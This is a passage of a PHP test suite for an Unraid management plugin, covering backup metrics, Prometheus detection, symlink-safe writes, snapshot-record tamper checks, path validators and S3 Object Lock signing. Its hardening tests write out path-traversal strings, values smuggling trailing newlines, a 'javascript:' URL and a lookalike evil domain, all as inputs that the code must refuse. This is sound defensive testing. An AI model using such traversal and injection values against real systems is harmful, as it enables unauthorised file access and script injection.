    $run = fn (string $result, int $end, array $more = []) => ['interface' => 1, 'mode' => 'backup', 'result' => $result, 'started' => $end - 600, 'finished' => $end] + $more;
    file_put_contents("$st/last-run.json", jsonEncode($run('failed', 1791229704, ['downtime_s' => 285, 'errors' => 2, 'warnings' => 1,
        'kopia' => ['enabled' => true, 'planned' => ['app:a', 'b', 'c'], 'done' => [['name' => 'app:a', 'ok' => true], ['name' => 'b', 'ok' => false]]],
        'packages' => ['written' => true, 'written_bytes' => 300, 'list' => [['kind' => 'app', 'name' => 'immich', 'bytes' => 200, 'result' => 'ok'],
            ['kind' => 'vm', 'name' => 'Debian', 'bytes' => 100, 'result' => 'ok'], ['kind' => 'app', 'name' => 'planned', 'bytes' => 1, 'result' => 'planned']]]])));
    file_put_contents("$st/history.jsonl", jsonEncode($run('warnings', 1791100000)) . "\n" . jsonEncode($run('ok', 1791200000)) . "\n"
        . jsonEncode(['mode' => 'backup', 'result' => 'skipped', 'finished' => 1791210000]) . "\n" . jsonEncode($run('failed', 1791229704)) . "\n");
    file_put_contents("$st/status.json", jsonEncode(['result' => 'running', 'mode' => 'backup', 'phase' => 'kopia', 'started' => 1791241202]));
    $bk = [];
    foreach (backupMetrics($st) as $f) {
        $bk[$f['name']] = count($f['samples']) === 1 && !$f['samples'][0][0] ? $f['samples'][0][1] : $f['samples'];
    }
    same('backup metrics: the last run', [false, [[['result' => 'failed'], 1]], 1791229704, 600, 285, 2, 1],
        [$bk['uso_backup_last_success'] ?? null, $bk['uso_backup_last_result'] ?? null, $bk['uso_backup_last_run_end_timestamp_seconds'] ?? null,
         $bk['uso_backup_last_duration_seconds'] ?? null, $bk['uso_backup_last_downtime_seconds'] ?? null, $bk['uso_backup_last_errors'] ?? null, $bk['uso_backup_last_warnings'] ?? null]);
    same('backup metrics: the last success from the history (a skipped run is none)', 1791200000, $bk['uso_backup_last_success_timestamp_seconds'] ?? null);
    same('backup metrics: Kopia sources — one not reached counts as failed', [[['result' => 'ok'], 1], [['result' => 'failed'], 2]], $bk['uso_backup_last_kopia_sources'] ?? null);
    same('backup metrics: package sizes, planned ones not', [[['kind' => 'app', 'name' => 'immich'], 200], [['kind' => 'vm', 'name' => 'Debian'], 100]], $bk['uso_backup_package_bytes'] ?? null);
    same('backup metrics: running needs the lock too', [false, null], [$bk['uso_backup_running'] ?? null, $bk['uso_backup_current_phase'] ?? null]);
    same('backup metrics: no skipped.json, no series', null, $bk['uso_backup_last_skipped_timestamp_seconds'] ?? null);
    file_put_contents("$st/skipped.json", jsonEncode(['time' => 1791244800, 'mode' => 'backup', 'reason' => 'lock_busy', 'result' => 'skipped']));
    $sk = array_values(array_filter(backupMetrics($st), fn ($f) => $f['name'] === 'uso_backup_last_skipped_timestamp_seconds'));
    same('backup metrics: a skipped run', [[['mode' => 'backup', 'reason' => 'lock_busy'], 1791244800]], $sk[0]['samples'] ?? null);
    file_put_contents("$st/skipped.json", '{"time":"soon","mode":"backup"}');
    same('backup metrics: skipped.json in another shape is left out', [], array_values(array_filter(backupMetrics($st), fn ($f) => $f['name'] === 'uso_backup_last_skipped_timestamp_seconds')));
    same('backup metrics: no state folder, nothing', [], backupMetrics("$st/none"));

    // Ms. Snapshotini: per pool and disk, Docker's layers left out; VMs only where they are on
    $pools = snapshotMetricsPools(['time' => 50, 'zfs' => ['pools' => [['name' => 'cache', 'snapused' => 10], ['name' => 'empty', 'snapused' => 0]],
        'snapshots' => [['pool' => 'cache', 't' => 5, 'docker' => false], ['pool' => 'cache', 't' => 9, 'docker' => false], ['pool' => 'cache', 't' => 99, 'docker' => true]]],
        'btrfs' => ['devices' => [['name' => 'disk1', 'scanned' => null], ['name' => 'disk2', 'scanned' => null], ['name' => 'disk3', 'scanned' => 40]],
                    'snapshots' => [['pool' => 'disk1', 't' => 7]]], 'vm' => ['available' => false, 'snapshots' => []]]);
    same('snapshot metrics: per pool and disk (a disk never read is left out)', [['zfs', 'cache', 2, 9, 10], ['zfs', 'empty', 0, 0, 0], ['btrfs', 'disk3', 0, 0, null], ['btrfs', 'disk1', 1, 7, null]],
        array_map(fn ($p) => [$p['fs'], $p['pool'], $p['n'], $p['t'], $p['used']], $pools['pools'] ?? []));

    // the team lead: open points by level, like the Dashboard tile (only desks that work here, nothing put aside)
    $care = ['time' => 70, 'checks' => [
        'backup' => [['level' => 'required', 'ok' => false], ['level' => 'required', 'ok' => null], ['level' => 'recommended', 'ok' => true],
                     ['level' => 'recommended', 'ok' => false, 'acked' => true], ['level' => 'recommended', 'ok' => false], ['level' => 'hint', 'ok' => null]],
        'gone' => [['level' => 'required', 'ok' => false]]]];
    $ct = caretakerMetrics($care, ['backup', 'caretaker']);
    same('caretaker metrics: open by level', [[['level' => 'required'], 2], [['level' => 'recommended'], 1], [['level' => 'hint'], 1]], $ct[0]['samples'] ?? null);

    // the chain: where the host reaches Prometheus, and its target for the Node Exporter
    same('prometheus: published port', ['http://127.0.0.1:9090', false],
        caretakerPrometheusUrl(['HostConfig' => ['NetworkMode' => 'bridge'], 'NetworkSettings' => ['Ports' => ['9090/tcp' => [['HostIp' => '0.0.0.0', 'HostPort' => '9090']]],
            'Networks' => ['bridge' => ['IPAddress' => '172.17.0.5']]]]));
    same('prometheus: host network with its own port', ['http://127.0.0.1:9191', false],
        caretakerPrometheusUrl(['Args' => ['--web.listen-address=:9191'], 'HostConfig' => ['NetworkMode' => 'host']]));
    same('prometheus: an address of its own (br0)', ['http://192.168.7.30:9090', true],
        caretakerPrometheusUrl(['HostConfig' => ['NetworkMode' => 'br0'], 'NetworkSettings' => ['Ports' => [], 'Networks' => ['br0' => ['IPAddress' => '192.168.7.30']]]]));
    $targets = fn (array ...$t) => ['status' => 'success', 'data' => ['activeTargets' => $t]];
    $tg = fn (string $job, string $url, string $health) => ['labels' => ['job' => $job, 'instance' => parse_url($url, PHP_URL_HOST) . ':' . parse_url($url, PHP_URL_PORT)],
                                                          'scrapeUrl' => $url, 'health' => $health];
    same('prometheus: node target up', ['up' => true, 'target' => '192.168.7.20:9100'],
        caretakerNodeTarget($targets($tg('prometheus', 'http://localhost:9090/metrics', 'up'), $tg('node', 'http://192.168.7.20:9100/metrics', 'up'))));
    same('prometheus: a target on port 9100 under another job, down', ['up' => false, 'target' => '10.0.0.2:9100'],
        caretakerNodeTarget($targets($tg('server', 'http://10.0.0.2:9100/metrics', 'down'))));
    same('prometheus: no node job', 'none', caretakerNodeTarget($targets($tg('prometheus', 'http://localhost:9090/metrics', 'up'))));
    same('prometheus: an odd answer', null, caretakerNodeTarget(['status' => 'error']));
    hardeningRm(dirname($dir));
    $GLOBALS['metricsNoted'] = [];
}

// ===================================================================== hardening

/** A temporary folder for a test, removed again by hardeningRm() */
function hardeningTmp(string $name): string
{
    $dir = sys_get_temp_dir() . "/uso-test-$name-" . getmypid();
    @mkdir($dir, 0700, true);
    return $dir;
}

function hardeningRm(string $dir): void
{
    if (!is_dir($dir) || is_link($dir)) {
        @unlink($dir);
        return;
    }
    foreach (array_diff(scandir($dir) ?: [], ['.', '..']) as $n) {
        hardeningRm("$dir/$n");
    }
    @rmdir($dir);
}

/** writeAtomic(): a link at the target or a file in the way is never written through; the mode is there from the start */
function testSafeWrites(): void
{
    $dir = hardeningTmp('write');
    $victim = "$dir/victim.txt";
    file_put_contents($victim, 'keep');
    symlink($victim, "$dir/state.json");
    writeAtomic("$dir/state.json", '{"ok":true}', 0600, 0, 0);
    same('writeAtomic: the victim behind a link is untouched', 'keep', file_get_contents($victim));
    check('writeAtomic: the link is replaced by a file', !is_link("$dir/state.json") && is_file("$dir/state.json"));
    same('writeAtomic: mode 0600', '600', substr(sprintf('%o', fileperms("$dir/state.json")), -3));
    writeAtomic("$dir/script", "#!/bin/bash\n", 0755, 0, 0);
    same('writeAtomic: a script keeps its execute bits', '755', substr(sprintf('%o', fileperms("$dir/script")), -3));
    same('writeAtomic: no temporary files left', [], glob("$dir/.*.tmp") ?: []);
    $tmp = writeNewFile("$dir/.x", 'a');
    check('writeNewFile: a new file of its own', $tmp !== null && is_file($tmp) && str_starts_with(basename($tmp), '.x.'));

    // the mailbox and data/office: a real folder of the web server's user, closed to others
    $box = "$dir/mailbox";
    mkdir($box, 0770);
    chown($box, WEB_UID);
    check('mailbox of the web server: accepted', privateDirOk($box));
    chmod($box, 0777);
    check('mailbox open to others: refused', !privateDirOk($box));
    chmod($box, 0770);
    chown($box, WEB_UID + 1);
    check("mailbox of another user: refused", !privateDirOk($box));
    symlink($box, "$dir/linkbox");
    check('mailbox through a link: refused', !privateDirOk("$dir/linkbox"));
    check('a link where a private folder belongs is left alone', !privateDirEnsure("$dir/linkbox", 0700, false) && is_link("$dir/linkbox"));
    check('a link where the mailbox belongs becomes a folder', privateDirEnsure("$dir/linkbox", 0770, true) && !is_link("$dir/linkbox"));
    same('the folder the link pointed to keeps its owner', WEB_UID + 1, fileowner($box));
    hardeningRm($dir);
}

/**
 * The page waits for an answer while the agent restarts (a deploy) or stops: askAgent() notices it in
 * agent.json (pid and start time, running) and says so at once — never a wait of ten minutes. The web
 * side in a process of its own (bootstrap.php, the data folder in a temporary folder); this one plays
 * the agent.
 */
function testAgentRestarted(): void
{
    $tmp = hardeningTmp('restarted');
    mkdir("$tmp/mailbox", 0770);
    $info = fn (int $started, bool $running = true) => file_put_contents("$tmp/agent.json",
        json_encode(['running' => $running, 'version' => AGENT_VERSION, 'pid' => 4242, 'started' => $started, 'host' => 'test', 'desks' => []]));
    $web = "$tmp/web.php";
    file_put_contents($web, '<?php require ' . var_export(OFFICE_DIR . '/src/bootstrap.php', true) . '; $t = microtime(true);'
        . ' try { $out = askAgent("x.y", [], 8); } catch (Throwable $e) { $out = get_class($e); }'
        . ' echo json_encode(["out" => $out, "s" => round(microtime(true) - $t, 1)]);');
    // the web side asks; $agent(request file) plays the agent once the request is there
    $ask = function (callable $agent) use ($web, $tmp): array {
        $p = proc_open([PHP_BINARY, $web], [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null,
            ['OFFICE_DATA_DIR' => $tmp, 'PATH' => getenv('PATH')]);
        $request = null;
        for ($i = 0; $i < 60 && $request === null; $i++) {
            usleep(50000);
            $request = (glob("$tmp/mailbox/*.request") ?: [null])[0];
        }
        if ($request !== null) {
            $agent($request);
        }
        $raw = (string) stream_get_contents($pipes[1]) . (string) stream_get_contents($pipes[2]);
        proc_close($p);
        return (json_decode(substr($raw, (int) strpos($raw, '{')), true) ?: []) + ['raw' => $raw];
    };
    $answer = fn (string $request, array $a) => file_put_contents(substr($request, 0, -strlen('.request')) . '.response', json_encode($a)) && unlink($request);

    $info(1000);
    $r = $ask(fn (string $req) => $answer($req, ['ok' => true, 'n' => 1]));
    same('restart: an answer as always', ['ok' => true, 'n' => 1], $r['out'] ?? $r['raw']);

    // a deploy: the new agent empties the mailbox when it starts, then writes agent.json
    $r = $ask(function (string $req) use ($info): void {
        unlink($req);
        $info(1001);
    });
    check('restart: the request emptied away by a new agent is told at once', ($r['out'] ?? '') === 'AgentRestarted' && ($r['s'] ?? 99) < 3, $r['raw']);

    // the new agent came before the request (it was not emptied away): it answers, nothing is told
    $info(1002);
    $r = $ask(function (string $req) use ($info, $answer): void {
        $info(1003);
        usleep(1200000);                    // the web side sees the new agent while the request is still there
        $answer($req, ['ok' => true, 'n' => 2]);
    });
    same('restart: a request the new agent still finds is answered', ['ok' => true, 'n' => 2], $r['out'] ?? $r['raw']);

    // stopped (array stop, plugin update): a request still waiting is taken back and told
    $info(1004);
    $r = $ask(fn () => $info(1004, false));
    check('restart: a stopped agent is told at once', ($r['out'] ?? '') === 'AgentRestarted' && ($r['s'] ?? 99) < 3, $r['raw']);
    same('restart: its request taken back', [], glob("$tmp/mailbox/*.request") ?: []);

    // a restart in place keeps the pid — the start time tells
    $info(1005);
    $r = $ask(function (string $req) use ($info): void {
        unlink($req);                       // picked up, then the agent restarted itself before answering
        usleep(300000);
        $info(1006);
    });
    same('restart: in place (same pid, new start time) is told too', 'AgentRestarted', $r['out'] ?? $r['raw']);
    hardeningRm($tmp);
}

/**
 * Ms. Snapshotini's record of what she removed (data/snapshot/deletes.jsonl, root only) and how the night
 * watchman reads it: it beats her lines in the office's log, which the web server's user may write — those
 * count only until the record is there.
 */
function testSnapshotRecord(): void
{
    $tmp = hardeningTmp('snaprecord');
    mkdir("$tmp/data", 0755);
    $file = "$tmp/data/snapshot/deletes.jsonl";
    $GLOBALS['snapshotRecordFile'] = $file;
    $mode = fn (string $p) => substr(sprintf('%o', fileperms($p)), -3);
    check('record: set up — a folder of root\'s own (0700), an empty file (0600)',
        snapshotRecordReady() && is_file($file) && filesize($file) === 0 && $mode(dirname($file)) === '700' && $mode($file) === '600' && fileowner($file) === 0);
    snapshotRecord(['do' => 'deleted', 'fs' => 'zfs', 'ds' => 'hive/My Share', 'names' => ['a', 'b']]);
    snapshotRecord(['do' => 'deleted', 'fs' => 'btrfs', 'path' => '/mnt/disk1/.btrfs-snap/x']);
    snapshotRecord(['do' => 'released', 'ds' => 'hive/data', 'name' => 'keep']);
    snapshotRecord(['do' => 'renamed', 'where' => 'hive/data', 'from' => 'manual', 'to' => 'manual2']);
    same('record: a line each, with its time', [['deleted', true], ['deleted', true], ['released', true], ['renamed', true]],
        array_map(fn ($l) => [json_decode($l, true)['do'] ?? null, is_int(json_decode($l, true)['t'] ?? null)], file($file) ?: []));

    // the watchman: taking the watch over = from now on; the round it first shows up = from its beginning; then by its position
    [$ev, $pos] = watchmanSnapRecord($file, null, true);
    same('record read, the watch taken over: from now on', [[], filesize($file)], [$ev['d'], $pos['size']]);
    [$ev, $pos] = watchmanSnapRecord($file, null, false);
    same('record read: her deletions (several at once, btrfs), releases, renames',
        [['hive/My Share@a', 'hive/My Share@b', '/mnt/disk1/.btrfs-snap/x'], ['hive/data@keep'], [['hive/data', 'manual', 'manual2']]],
        [array_keys($ev['d']), array_keys($ev['r']), array_map(fn ($m) => array_slice($m, 0, 3), $ev['m'])]);
    snapshotRecord(['do' => 'deleted', 'fs' => 'zfs', 'ds' => 'hive/data', 'names' => ['c']]);
    [$ev, $pos] = watchmanSnapRecord($file, $pos, false);
    same('record read: by its position', ['hive/data@c'], array_keys($ev['d']));

    // full: it becomes deletes.jsonl.1 — the watchman reads the rest of that one (by its inode), then the new one
    file_put_contents($file, json_encode(['t' => 1, 'do' => 'padding', 'x' => str_repeat('x', SNAPSHOT_RECORD_MAX)]) . "\n", FILE_APPEND);
    snapshotRecord(['do' => 'deleted', 'fs' => 'zfs', 'ds' => 'hive/data', 'names' => ['d']]);
    [$ev, $pos] = watchmanSnapRecord($file, $pos, false);
    same('record full: a new one begins, one older kept, nothing missed', [true, 1, ['hive/data@d']],
        [is_file("$file.1"), count(file($file) ?: []), array_keys($ev['d'])]);

    // a record others could have written is no record: the watchman refuses it, she sets it aside and begins anew
    foreach (['open to others' => fn () => chmod($file, 0644), 'not root\'s' => fn () => chown($file, 99), 'the folder open to others' => fn () => chmod(dirname($file), 0755)] as $what => $do) {
        $do();
        same("record refused by the watchman: $what", null, watchmanSnapRecord($file, $pos, false));
        check("record: set aside and begun anew — $what", snapshotRecordReady() && $mode(dirname($file)) === '700' && fileowner($file) === 0 && $mode($file) === '600');
    }
    same('record: what others could have written is set aside, never read again', 2, count(glob("$file.untrusted-*") ?: []));
    snapshotRecord(['do' => 'deleted', 'fs' => 'zfs', 'ds' => 'hive/data', 'names' => ['e']]);
    [$ev] = watchmanSnapRecord($file, $pos, false);
    same('record begun anew: read from its beginning', ['hive/data@e'], array_keys($ev['d']));
    unlink($file);
    symlink("$file.1", $file);
    same('record refused by the watchman: a link', null, watchmanSnapRecord($file, $pos, false));
    unlink($file);
    $pos = watchmanSnapRecord("$file.1", null, true)[1];        // (only .1 there for a moment: what she wrote there still counts)

    // in his round: the record beats the log; the log's lines count only until the record is there
    snapshotRecordReady();
    $log = "$tmp/agent.log";
    file_put_contents($log, '');
    $paths = ['agent_log' => $log, 'snap_record' => $file];
    $round = fn (?array $known) => watchmanSnaps($paths, $known, [], time())['known'];
    $known = $round(null);
    check('round: the record\'s and the log\'s positions kept', is_array($known['record'] ?? null) && is_array($known['log'] ?? null));
    $stamp = date('Y-m-d H:i:s');
    file_put_contents($log, "$stamp  Deleted: hive/forged@x\n$stamp  Released: hive/forged@held\n", FILE_APPEND);
    snapshotRecord(['do' => 'deleted', 'fs' => 'zfs', 'ds' => 'hive/real', 'names' => ['y']]);
    $k2 = $round($known);
    same('round: her record counts, a line in the log alone doesn\'t (forged)', [['hive/real@y'], []], [array_keys($k2['office']['d'] ?? []), array_keys($k2['office']['r'] ?? [])]);
    // an older office's snaps.json (no record yet): what its log said since, and the record from its beginning
    $old = $known;
    unset($old['record']);
    $k3 = $round($old);
    same('round: the record first there — the log\'s lines before it count too', ['hive/real@y', 'hive/forged@x'], array_keys($k3['office']['d'] ?? []));
    // she kept a record, and it isn't one now: her log lines alone prove nothing
    file_put_contents($log, "$stamp  Deleted: hive/forged@z\n", FILE_APPEND);
    chmod($file, 0644);
    $k4 = $round($k2);
    check('round: a record that isn\'t one any more — the log\'s lines don\'t count', !isset($k4['office']['d']['hive/forged@z']) && isset($k4['office']['d']['hive/real@y']));
    unset($GLOBALS['snapshotRecordFile']);
    hardeningRm($tmp);
}

/** Ms. Dustdevil's manifests lie in folders others may write to: only entries of her own shape count */
function testTrashManifest(): void
{
    $st = '20261005-120000';
    foreach ([['templates/my-app.xml', 'template'], ['compose/stack', 'stack'], ['appdata/foo', 'appdata'], ['vms/win11', 'domain'],
              ['strays/0a1b2c3d/my-x.xml', 'stray'], ['icons/0a1b2c3d/compose.override.yaml', 'icon'], ['nvram/abc_VARS.fd', 'nvram'],
              ["@cache/appdata/_UnraidSecretaryOffice-trash-$st-foo", 'appdata'], ['restore/0a1b2c3d/pg.aside-20261006-172818', 'leftover'],
              ["@master/domains/_UnraidSecretaryOffice-trash-$st-Win.aside-20261006-175854", 'leftover']] as [$as, $kind]) {
        check("manifest as accepted: $as", clTrashAsOk($as, $kind, $st));
    }
    foreach ([['../../../../boot/config/super.dat', 'template'], ['templates/../../x', 'template'], ['templates/./x', 'template'],
              ['/boot/config/go', 'template'], ['templates//x', 'template'], ['appdata/foo', 'template'], ['templates/a/b', 'template'],
              ['strays/x', 'stray'], ["templates/x\ny", 'template'], ['', 'template'], ['@cache/appdata', 'appdata'],
              ['@cache/appdata/_UnraidSecretaryOffice-trash-20990101-000000-foo', 'appdata'], ["@cache/appdata/_UnraidSecretaryOffice-trash-$st-foo", 'template'],
              ["@cache/../x/_UnraidSecretaryOffice-trash-$st-foo", 'appdata'], ['@cache', 'appdata'], ['restore/pg.aside-20261006-172818', 'leftover'],
              ['restore/0a1b2c3d/pg.aside-20261006-172818', 'appdata'], ['appdata/foo', 'leftover']] as [$as, $kind]) {
        check('manifest as refused: ' . json_encode($as) . " ($kind)", !clTrashAsOk($as, $kind, $st));
    }
    check('manifest from: an absolute path', clTrashPathOk('/mnt/cache/appdata/foo'));
    foreach (['mnt/x', '/mnt/../boot', '/mnt/./x', '/mnt//x', "/mnt/x\n", '/'] as $p) {
        check('manifest from refused: ' . json_encode($p), !clTrashPathOk($p));
    }
    check('dataset name ok', clZfsNameOk('cache/appdata/foo bar'));
    check('dataset name with .. refused', !clZfsNameOk('cache/../foo'));

    $dir = hardeningTmp('trash');
    mkdir("$dir/run/appdata", 0755, true);
    mkdir("$dir/elsewhere", 0755);
    symlink("$dir/elsewhere", "$dir/run/strays");
    check('restore source inside the run: ok', clRunPathOk("$dir/run", 'appdata/foo'));
    check('restore source through a linked folder: refused', !clRunPathOk("$dir/run", 'strays/0a1b2c3d/my-x.xml'));
    hardeningRm($dir);
}

/** Jack Emby's path mappings and EmbyCache's paths never lead out of the shares */
function testEmbyPaths(): void
{
    foreach ([['/media/movies', '/mnt/user/Filme'], ['/media/tv/', '/mnt/user/Serien/TV'], ['/media/skip', '']] as [$from, $to]) {
        check("mapping accepted: $from => $to", embyMappingOk($from, $to));
    }
    foreach ([['/media', '/mnt/user/../../boot'], ['/media', '/mnt/user/Filme/../../../etc'], ['media', '/mnt/user/Filme'],
              ['/media/../x', '/mnt/user/Filme'], ['/media', '/mnt/cache/Filme'], ['/media', "/mnt/user/Filme\n"], ['/media', '/mnt/user/']] as [$from, $to]) {
        check('mapping refused: ' . json_encode([$from, $to]), !embyMappingOk($from, $to));
    }
    [$exit] = run(['python3', '--version'], 10);
    if ($exit !== 0) {
        return;                                    // no Python on this server: EmbyCache can't run here either
    }
    $py = 'import sys; sys.path.insert(0, sys.argv[1]); import embycache_lib as l; '
        . 'loc = l.Locations({"cache_path": "/mnt/cache", "array_path": "/mnt/user0", "user_path": "/mnt/user", "array_disks_glob": "/mnt/disk[0-9]*"}, '
        . '{"/media/movies": "/mnt/user/Filme"}); '
        . 'print(loc.rel_from_docker("/media/movies/A/a.mkv"), loc.rel_from_docker("/media/movies/../../../../boot/config/go"), '
        . 'loc.rel_from_docker("/media/movies/A/../../Other/x"))';
    [$exit, $out] = run(['env', 'EMBYCACHE_DIR=' . sys_get_temp_dir(), 'PYTHONDONTWRITEBYTECODE=1', 'python3', '-c', $py, OFFICE_DIR . '/embycache'], 30);
    same('EmbyCache: paths with ".." are skipped', 'Filme/A/a.mkv None None', trim($out));
}

/** Validators end at the end of the string: "$" alone would let a trailing newline through into a name, a file or a command */
function testAnchors(): void
{
    check('snapshot name ok', preg_match(SNAPSHOT_NAME, 'manual-20261005') === 1);
    check('snapshot name with a trailing newline refused', preg_match(SNAPSHOT_NAME, "manual-20261005\n") === 0);
    check('menu name ok', officeMenuNameValid('Office'));
    check('menu name with a trailing newline refused', !officeMenuNameValid("Office\n"));
    check('picture address ok', clIconUrlOk('https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/png/emby.png'));
    check('picture address with a trailing newline refused', !clIconUrlOk("https://example.com/a.png\n"));
    check('plan id with a trailing newline refused', preg_match(SNAPPLAN_ID, "daily\n") === 0);
}

/** The release the caretaker links to: a version number and a page of the office's repository on GitHub, nothing else */
function testUpdateClean(): void
{
    $ok = officeUpdateClean(['latest' => '1.26.0', 'url' => 'https://github.com/' . OFFICE_REPO . '/releases/tag/v1.26.0']);
    same('release kept', ['1.26.0', 'https://github.com/' . OFFICE_REPO . '/releases/tag/v1.26.0'], [$ok['latest'] ?? null, $ok['url']]);
    $bad = officeUpdateClean(['latest' => "99\n", 'url' => 'javascript:alert(1)']);
    same('release with odd values', [null, ''], [$bad['latest'] ?? null, $bad['url']]);
    same('a link elsewhere is dropped', '', officeUpdateClean(['url' => 'https://github.com.evil.example/x'])['url']);
}

/**
 * Ransomware protection: does the bucket keep S3 Object Lock? AWS's own Signature V4 example, the region
 * an endpoint names, what each answer means (enabled / off / unsupported / unknown and why), how the
 * request is made (Amazon virtual-hosted and signed again for the bucket's region, elsewhere path style)
 */
function testAdvisorObjectLock(): void
{
    $e = hash('sha256', '');
    same('s3 signature: AWS\'s own example (GET Bucket Lifecycle, 2013-05-24)',
        'AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20130524/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, '
        . 'Signature=fea454ca298b7da1c68078a5d1bdbfbbe0d65c699e0f91ac7a200a0136783543',
        advisorS3Sign('GET', '/', ['lifecycle' => ''], ['host' => 'examplebucket.s3.amazonaws.com', 'x-amz-date' => '20130524T000000Z', 'x-amz-content-sha256' => $e],
            'AKIAIOSFODNN7EXAMPLE', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', 'us-east-1', '20130524T000000Z'));
    same('s3 region: from the endpoint', ['eu-central-1', 'eu-central-003', 'eu-central-2', 'us-east-1', 'eu-central-1', 'fsn1', null, 'us-west-2'],
        array_map('advisorS3Region', ['s3.eu-central-1.amazonaws.com', 's3.eu-central-003.backblazeb2.com', 's3.eu-central-2.wasabisys.com', 's3.amazonaws.com',
            's3.eu-central-1.s4.mega.io', 'fsn1.your-objectstorage.com', 'minio.lan:9000', 's3.dualstack.us-west-2.amazonaws.com']));

    $ans = fn (int $status, string $body, array $headers = []) => ['status' => $status, 'headers' => $headers, 'body' => $body, 'error' => $status ? null : 'timeout'];
    $err = fn (string $code) => "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Error><Code>$code</Code><Message>x</Message></Error>";
    $on = '<ObjectLockConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><ObjectLockEnabled>Enabled</ObjectLockEnabled>';
    foreach ([
        'enabled, with the bucket\'s own rule' => [$ans(200, "$on<Rule><DefaultRetention><Mode>GOVERNANCE</Mode><Days>14</Days></DefaultRetention></Rule></ObjectLockConfiguration>"), 's3',
                                                  ['state' => 'enabled', 'mode' => 'GOVERNANCE', 'days' => 14]],
        'enabled, a rule in years'            => [$ans(200, "$on<Rule><DefaultRetention><Mode>COMPLIANCE</Mode><Years>1</Years></DefaultRetention></Rule></ObjectLockConfiguration>"), 'aws',
                                                  ['state' => 'enabled', 'mode' => 'COMPLIANCE', 'days' => 365]],
        'enabled, no rule'                    => [$ans(200, "$on</ObjectLockConfiguration>"), 'b2', ['state' => 'enabled', 'mode' => null, 'days' => null]],
        'off: the bucket made without it'     => [$ans(404, $err('ObjectLockConfigurationNotFoundError')), 'aws', ['state' => 'off']],
        'off: a configuration, not enabled'   => [$ans(200, '<ObjectLockConfiguration></ObjectLockConfiguration>'), 'minio', ['state' => 'off']],
        'unsupported: not implemented'        => [$ans(501, $err('NotImplemented')), 's3', ['state' => 'unsupported']],
        'unsupported: answered with a listing' => [$ans(200, '<ListBucketResult><Name>b1</Name></ListBucketResult>'), 's3', ['state' => 'unsupported']],
        'unsupported: MEGA S4, an unclear no' => [$ans(403, $err('AccessDenied')), 'mega', ['state' => 'unsupported']],
        'unknown: the keys refused'           => [$ans(403, $err('SignatureDoesNotMatch')), 'mega', ['state' => 'unknown', 'why' => 'keys']],
        'unknown: not allowed to read it'     => [$ans(403, $err('AccessDenied')), 'b2', ['state' => 'unknown', 'why' => 'denied']],
        'unknown: no such bucket'             => [$ans(404, $err('NoSuchBucket')), 'wasabi', ['state' => 'unknown', 'why' => 'no_bucket']],
        'unknown: no answer'                  => [$ans(0, ''), 's3', ['state' => 'unknown', 'why' => 'unreachable']],
        'unknown: something else'             => [$ans(500, $err('InternalError')), 's3', ['state' => 'unknown', 'why' => 'other', 'code' => 'InternalError']],
    ] as $what => [$answer, $provider, $want]) {
        same("object lock: $what", $want, advisorObjectLockState($answer, $provider));
    }

    // Amazon: virtual-hosted; signed for us-east-1 first, then for the region the bucket names
    $seen = [];
    $http = function (string $url, array $h) use (&$seen, $ans, $err, $on): array {
        $seen[] = [$url, $h];
        return count($seen) === 1 ? $ans(400, $err('AuthorizationHeaderMalformed') . '<Region>eu-west-1</Region>', ['x-amz-bucket-region' => 'eu-west-1'])
            : $ans(200, "$on</ObjectLockConfiguration>");
    };
    $keys = ['access' => 'AKIATEST', 'secret' => 'never-in-a-request'];
    $r = advisorObjectLock(['provider' => 'aws', 'endpoint' => 's3.amazonaws.com', 'region' => null, 'bucket' => 'my-backups'] + $keys, $http);
    $region = fn (int $i) => preg_match('#/\d{8}/([a-z0-9-]+)/s3/aws4_request#', (string) ($seen[$i][1]['Authorization'] ?? ''), $m) ? $m[1] : null;
    same('object lock on Amazon: virtual-hosted, signed again for the bucket\'s region, the secret key in no request',
        ['enabled', 'https://my-backups.s3.amazonaws.com/?object-lock', 'us-east-1', 'eu-west-1', false, true],
        [$r['state'], $seen[0][0] ?? null, $region(0), $region(1), str_contains(json_encode($seen), 'never-in-a-request'),
         (bool) preg_match('/^\d{8}T\d{6}Z$/D', (string) ($seen[0][1]['x-amz-date'] ?? ''))]);
    $seen = [];
    advisorObjectLock(['provider' => 'minio', 'endpoint' => 'minio.lan:9000', 'region' => null, 'bucket' => 'b.with.dots'] + $keys,
        function (string $url, array $h) use (&$seen, $ans): array {
            $seen[] = [$url, $h];
            return $ans(404, '<Error><Code>ObjectLockConfigurationNotFoundError</Code></Error>');
        });
    same('object lock elsewhere: path style, the host with its port, asked once', ['https://minio.lan:9000/b.with.dots?object-lock', 1, 'us-east-1'],
        [$seen[0][0] ?? null, count($seen), $region(0)]);
    same('object lock: https only, never anything else', 'no curl', advisorHttps('http://example.test/', [])['error']);
}

/**
 * The Consultant's Kopia setup: the user's keys and password go from the web side through a RAM
 * file (gone once read) to Kopia's stdin — end to end with a stand-in for docker and Kopia: no
 * secret in any file but that one (and Kopia's own config), in no log, no state, no answer, no ps.
 */
function testAdvisorSecrets(): void
{
    $tmp = hardeningTmp('advisor-secrets');
    $inbox = "$tmp/inbox";
    mkdir($inbox, 0700);
    $put = function (string $name, string $text, int $mode = 0600) use ($inbox): string {
        file_put_contents("$inbox/$name.secret", $text);
        chmod("$inbox/$name.secret", $mode);
        return $name;
    };
    $id = str_repeat('a', 32);
    same('secret: taken', ['password' => 'pw'], advisorSecretTake($put($id, '{"password":"pw"}'), $inbox));
    check('secret: gone once taken', !file_exists("$inbox/$id.secret"));
    foreach (['open to others' => fn () => $put($id, '{"password":"pw"}', 0644), 'a wrong name' => fn () => '../inbox/x',
              'unknown' => fn () => str_repeat('b', 32), 'not JSON' => fn () => $put($id, 'pw')] as $what => $make) {
        try {
            advisorSecretTake($make(), $inbox);
            check("secret refused: $what", false);
        } catch (Problem $p) {
            same("secret refused: $what", 'ad_secret_missing', $p->key);
        }
    }
    check('secret: a refused one is gone all the same', !file_exists("$inbox/$id.secret"));
    file_put_contents("$tmp/victim", 'keep');
    symlink("$tmp/victim", "$inbox/$id.secret");
    try {
